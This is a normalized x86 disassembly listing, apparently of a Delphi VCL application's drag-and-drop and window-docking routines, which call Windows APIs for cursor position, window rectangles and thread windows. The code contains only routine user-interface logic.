mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_453fd4
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_45395c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_453fd4
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_452f83
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_453fd4
sub_452fdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453006
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45306c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452e18
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_453098
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4033e8
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4530c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4033e8
xor edx edx
sub_45311c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_45dfa4
sub_45313c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_45df8c
sub_453160
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_453048
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dcc
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42c058
mov edx eax
mov eax esi
call sub_424f48
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4531c4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4531f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45306c
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_453250
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4033e8
pop edi
pop esi
pop ebp
retn 0x4
sub_453274
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_453298
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_453274
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_453274
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_453354
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4533c0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_453810
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4528d8
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_45c380
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_45c380
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45c380
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4033e8
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_453354
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_45c380
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_45c380
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_453558
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_45c380
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45c380
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_45359c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_452db4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4533c0
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418dc4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_45c380
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_453558
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4033e8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_45ae78
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_452d24
sub_4536f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_418e20
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418cb4
mov edx edi
mov eax [ rw-data ]
call sub_418c68
jmp r-xdata
sub_453758
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4537b0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40443c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4528a4
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_453810
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4537b0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_45383c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_45359c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_453810
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_453758
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_45c380
mov [ esi ] eax
sub_45388c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_453758
cmp eax 0x1
sbb eax eax
inc eax
sub_4538c8
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_45ade4
test eax eax
je r-xdata
mov eax esi
call sub_45ade4
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_4542f8
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418dc4
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418e20
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_45adf8
mov edi eax
jmp r-xdata
sub_45395c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_45383c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_45de60
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_45388c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_45388c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_455590
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_45388c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45de1c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4538c8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4033e8
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_45df48
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_45de60
jmp r-xdata
mov eax [ rw-data ]
call sub_45dfbc
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_455590
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4033e8
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4033e8
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407f48
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_453c2c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_452e58
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_45de60
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_45395c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_453d9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_453f41
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4033e8
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4033e8
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_453160
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_453c2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_453048
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_45c380
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417744
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_455564
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_417744
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_453f60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4033e8
mov ebx eax
sub_453fd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4542a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_45422e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_452ea0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40339c
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
jmp r-xdata
